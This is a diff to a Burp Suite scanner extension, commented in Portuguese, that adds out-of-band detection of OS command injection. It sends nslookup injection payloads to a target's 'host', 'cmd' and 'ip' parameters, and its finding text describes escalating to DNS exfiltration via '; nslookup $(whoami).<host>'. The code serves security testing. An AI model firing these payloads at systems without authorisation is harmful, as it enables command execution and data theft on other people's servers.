@@ -5,6 +5,7 @@ import burp.api.montoya.http.message.requests.HttpRequest;
 import burp.api.montoya.http.message.responses.HttpResponse;
 import com.rx0.burp.model.Finding;
 import com.rx0.burp.model.Severity;
+import com.rx0.burp.scanner.ScanContext;
 import com.rx0.burp.scanner.VulnCheck;
 
 import java.net.URLEncoder;
@@ -44,8 +45,45 @@ public class OsCommandInjectionCheck implements VulnCheck {
 
     @Override
     public List<Finding> executar(MontoyaApi api, String baseUrl) {
+        return executar(api, baseUrl, (ScanContext) null);
+    }
+
+    @Override
+    public List<Finding> executar(MontoyaApi api, String baseUrl, ScanContext ctx) {
         List<Finding> achados = new ArrayList<>();
         String base = baseUrl.endsWith("/") ? baseUrl.substring(0, baseUrl.length() - 1) : baseUrl;
+
+        // --- Confirmação OOB via interactsh: comando que faz o servidor "ligar de volta" ---
+        if (ctx != null && ctx.interactsh() != null && ctx.interactsh().isDisponivel()) {
+            for (String param : new String[]{"host", "cmd", "ip"}) {
+                try {
+                    String host = ctx.interactsh().criarProbe(
+                            "OS Command Injection confirmado via interação out-of-band no parâmetro '" + param + "'",
+                            Severity.CRITICA,
+                            base,
+                            "O comando injetado no parâmetro '" + param + "' fez o servidor resolver/contatar um domínio único " +
+                                    "de teste (via nslookup/curl embutido no payload) — confirmação inequívoca de execução de " +
+                                    "comando no sistema operacional do servidor, sem depender de medição de tempo.",
+                            "Nunca passe entrada do usuário para funções que executam comandos do SO. Use APIs nativas da " +
+                                    "linguagem em vez de shell, e se for inevitável, use allowlist rígida + escaping adequado.",
+                            "1) Reproduza com o payload exato: ; nslookup <host-gerado> (ou curl http://<host-gerado>/ em " +
+                                    "ambientes com curl disponível). 2) Uma vez confirmada a execução, escale pra extração de " +
+                                    "dados via DNS exfiltration: `; nslookup $(whoami).<host-gerado>` embute a saída do comando " +
+                                    "no próprio subdomínio consultado. 3) RCE confirmado — prioridade máxima.");
+                    if (host != null) {
+                        // Payload de DNS lookup (funciona tanto em shells Unix quanto via nslookup no Windows)
+                        String payloadUnix = "; nslookup " + host + " #";
+                        String payloadWin = "& nslookup " + host + " & ";
+                        for (String payload : new String[]{payloadUnix, payloadWin}) {
+                            String url = base + "/?" + param + "=" + URLEncoder.encode(payload, "UTF-8");
+                            api.http().sendRequest(HttpRequest.httpRequestFromUrl(url));
+                        }
+                    }
+                } catch (Exception e) {
+                    api.logging().logToError("[Rx0] Erro ao disparar probe OOB de OS Command Injection (param " + param + "): " + e.getMessage());
+                }
+            }
+        }
 
         // Baseline: tempo normal de resposta sem nenhum payload
         long tempoBaseline = medirTempo(api, base + "/");
